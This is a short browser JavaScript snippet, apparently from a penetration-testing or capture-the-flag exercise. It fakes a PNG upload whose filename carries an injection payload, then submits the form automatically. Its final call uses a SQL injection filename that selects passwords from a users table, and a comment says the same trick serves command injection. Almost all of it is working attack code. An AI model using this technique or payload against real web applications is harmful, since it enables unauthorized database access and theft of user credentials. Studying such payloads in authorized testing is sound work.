function setPayload(payloadName) {
    // 1. Create fake file content (a Blob) so the browser thinks it's a real image
    const blob = new Blob(["fake image data"], { type: 'image/png' });
    
    // 2. Wrap the Blob in a File object and give it your SQLi/Command Injection name
    const fakeFile = new File([blob], payloadName, { type: 'image/png' });
    
    // 3. Create a DataTransfer object (this mimics a user dragging and dropping a file)
    const dataTransfer = new DataTransfer();
    dataTransfer.items.add(fakeFile);
    
    // 4. Inject our fake file list into the actual HTML input element
    const fileInput = document.getElementById('file');
    fileInput.files = dataTransfer.files;

    document.querySelector('button[type="submit"]').click();

    
    console.log(`[+] Successfully loaded payload: ${fileInput.files[0].name}`);
}

setPayload("' UNION SELECT password FROM users LIMIT 1 OFFSET 0 -- .png");